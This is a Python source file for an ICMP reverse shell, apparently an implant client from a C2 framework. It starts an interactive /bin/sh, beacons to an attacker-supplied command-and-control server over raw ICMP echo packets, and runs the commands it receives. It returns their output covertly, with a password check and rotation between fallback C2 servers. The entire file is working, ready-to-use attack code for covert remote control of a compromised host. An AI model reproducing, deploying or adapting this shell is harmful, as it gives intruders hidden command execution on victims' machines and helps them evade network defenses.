#!/usr/bin/env python
from impacket import ImpactDecoder
from impacket import ImpactPacket
import subprocess as sub
from threading  import Thread
from Queue import Queue, Empty
# from queue import Queue, Empty
import os
import os.path
import select
import sys
import base64
import argparse
import socket
import fcntl
import struct
import time


# sysctl -w net.ipv4.icmp_echo_ignore_all=1
# python icmpsh_shell.py -shell 10.49.117.244
# https://github.com/nocow4bob/PiX-C2

class ICMPShell(object):
    missed = 0
    fallback_limit = 20
    delay = 3  # seconds
    buffer_size = 1432

    def __init__(self, ip_address, key):
        self.dst = ip_address
        self.key = key
        self.fallback_ips = []
        self.authenticated_ips = []
        self.decoder = ImpactDecoder.IPDecoder()
        self.queue = Queue()
        self.sock = None
        self.thread = None
        self.shell_proc = None
        self.set_shell()

    def set_blocking(self, fd):
        flags = fcntl.fcntl(fd, fcntl.F_GETFL)
        flags = flags | os.O_NONBLOCK
        fcntl.fcntl(fd, fcntl.F_SETFL, flags)
        return self

    def enqueue_output(self, out):
        for line in iter(out.readline, b''):
            self.queue.put(line)

    def set_shell(self):
        self.shell_proc = sub.Popen(
            ["/bin/sh", "-i"],
            shell=True,
            stdin=sub.PIPE,
            stdout=sub.PIPE,
            stderr=sub.STDOUT
            )
        self.thread = Thread(target=self.enqueue_output,
                             args=(self.shell_proc.stdout,))
        self.thread.daemon = False
        self.thread.start()
        return self

    def get_output(self):
        result = ""
        for n in range(50):
            try:
                line = self.queue.get_nowait()
            except Empty:
                pass
            else:
                result += line
        return result

    def run_command(self, command):
        result = ""
        if self.key != "" and self.dst not in self.authenticated_ips:
            if command == self.key:
                self.authenticated_ips.append(self.dst)
            else:
                result = 'AUTH'
            return result

        if len(command) < 1 or command == '\n':
            result += self.get_output()
            self.fallback_check()
            return result
        try:
            self.missed = 0
            self.shell_proc.stdin.write(command + '\n')
            result += self.get_output()
        except Exception as err:
            result = "Command error: %s" % err
        return result

    def set_fallback_ips(self, ips):
        self.fallback_ips = [self.dst]
        self.fallback_ips += ips
        return self

    def fallback_check(self):
        self.missed += 1
        if self.missed > self.fallback_limit:
            last_c2 = self.dst
            self.dst = self.fallback_ips.pop(0)
            self.fallback_ips.append(last_c2)
            self.missed = 0
        return self

    def run_shell(self):
        print('Calling %s' % self.dst)
        stdin_fd = sys.stdin.fileno()
        self.set_blocking(stdin_fd)
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except Exception as err:
            print('Socket error: %s' % err)
            sys.exit(1)

        self.sock.setblocking(0)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        cmd, cmd_out, prompt = '', '#', False
        ip = ImpactPacket.IP()
        ip.set_ip_dst(self.dst)
        icmp = ImpactPacket.ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(ImpactPacket.Data(cmd_out))
        icmp.set_icmp_cksum(0)
        icmp.auto_checksum = 1
        ip.contains(icmp)
        self.sock.sendto(ip.get_packet(), (self.dst, 0))

        while 1:
            if self.sock in select.select([self.sock], [], [])[0]:
                buff = self.sock.recv(4096)
                if 0 == len(buff):
                    self.sock.close()
                    sys.exit(0)

                ippacket = self.decoder.decode(buff)
                icmppacket = ippacket.child()
                data = icmppacket.get_data_as_string()

                cmd = data.strip()
                cmd_out = self.run_command(command=cmd)
                if cmd_out == "" and prompt is True:
                    cmd_out, prompt = '#', False
                elif cmd_out != "":
                    prompt = True

                if len(cmd_out) > self.buffer_size:
                    chunks, chunk_size = len(cmd_out), int(len(cmd_out)/self.buffer_size)
                    for i in range(0, chunks, chunk_size):
                        icmp.contains(ImpactPacket.Data(str(cmd_out[i:i+chunk_size])))
                        icmp.set_icmp_cksum(0)
                        icmp.auto_checksum = 1
                        ip.contains(icmp)
                        self.sock.sendto(ip.get_packet(), (self.dst, 0))
                else:
                    icmp.contains(ImpactPacket.Data(cmd_out))
                    icmp.set_icmp_cksum(0)
                    icmp.auto_checksum = 1
                    ip.contains(icmp)
                    self.sock.sendto(ip.get_packet(), (self.dst, 0))
                time.sleep(self.delay)
                cmd, cmd_out = '', '#'
            else:
                ip = ImpactPacket.IP()
                ip.set_ip_dst(self.dst)
                icmp = ImpactPacket.ICMP()
                icmp.set_icmp_type(icmp.ICMP_ECHO)
                icmp.contains(ImpactPacket.Data(cmd_out))
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1
                ip.contains(icmp)
                self.sock.sendto(ip.get_packet(), (self.dst, 0))
                cmd, cmd_out = '', '#'
                time.sleep(self.delay)


def main(options):
    dst = options.server
    key = options.password
    icmp_shell = ICMPShell(ip_address=dst, key=key)
    icmp_shell.run_shell()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description='ICMP shell')
    try:
        parser.add_argument('-server', action='store', help='IP address of C2 server')
        parser.add_argument('-password', default='', action='store', help='C2 password (optional)')

        if len(sys.argv) == 1:
            parser.print_help()
            exit(1)
        options = parser.parse_args()
        main(options=options)
    except Exception as err:
        print(str(err))
